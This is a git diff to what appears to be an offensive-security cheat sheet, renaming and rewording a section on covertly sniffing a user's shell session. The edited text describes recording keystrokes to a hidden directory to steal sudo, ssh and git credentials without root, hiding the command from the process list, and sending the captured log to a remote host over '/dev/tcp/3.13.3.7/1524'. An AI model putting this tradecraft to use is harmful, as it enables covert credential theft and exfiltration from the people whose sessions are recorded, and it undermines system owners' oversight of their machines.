@@ -91,7 +91,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [EncFS](#encfs)
    1. [Encrypting a file](#encrypting-file)
 1. [SSH session sniffing and hijacking](#ssh-sniffing)
-   1. [Sniff a user's SHELL session with script](#ssh-sniffing-script)
+   1. [Sniff a user's SHELL session](#session-sniffing)
    2. [Sniff all SHELL sessions with dtrace](#dtrace)
    2. [Sniff all SHELL sessions with eBPF](#bpf)
    1. [Sniff a user's outgoing SSH session with strace](#ssh-sniffing-strace)
@@ -1885,10 +1885,10 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 ---
 <a id="ssh-sniffing"></a>
 ## 10. SSH Sniffing
-<a id="ssh-sniffing-script"></a>
-**10.i Sniff a user's SHELL session with script**
+<a id="session-sniffing"></a>
+**10.i Sniff a user's SHELL session**
 
-A method to log the shell session of a user. Useful when you are not root but still like to capture the sudo/ssh credentials of the user. Records the user's keystrokes to `~/.config/.pty/.@*`.
+Records the user's keystrokes to `~/.config/.pty/.@*`. Useful when not root and needing to capture the sudo/ssh/git credentials of the user. 
 
 Cut & paste the following and follow the instructions:
 ```sh
@@ -1902,7 +1902,7 @@ Cut & paste the following and follow the instructions:
 ```
 
 - Combined with zapper to hide command options from the process list.
-- Requires util-linux >= 2.37 (-I flag). We pull the static bin from [ajam](https://bin.ajam.dev). 
+- Requires `/usr/bin/script` from util-linux >= 2.37 (-I flag). We pull the static bin from [ajam](https://bin.ajam.dev). 
 - Consider using /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 - Log in with `ssh -o "SetEnv LC_PTY=1"` to disable logging.
 
